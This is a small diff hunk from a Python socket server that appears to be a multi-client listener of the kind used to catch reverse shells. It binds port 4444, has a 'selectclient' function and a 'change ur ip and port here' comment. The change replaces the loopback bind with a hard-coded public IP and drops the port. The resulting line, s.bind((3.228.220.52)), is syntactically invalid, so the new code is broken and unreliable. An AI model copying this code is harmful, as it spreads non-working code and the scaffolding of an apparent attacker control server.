@@ -147,7 +147,7 @@ def selectclient():
 if __name__ == '__main__':
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    s.bind(("127.0.0.1", 4444))  # change ur ip and port here
+    s.bind((3.228.220.52))  # change ur ip and port here
     s.listen(5)
     clients = 0
     stop_threads = False
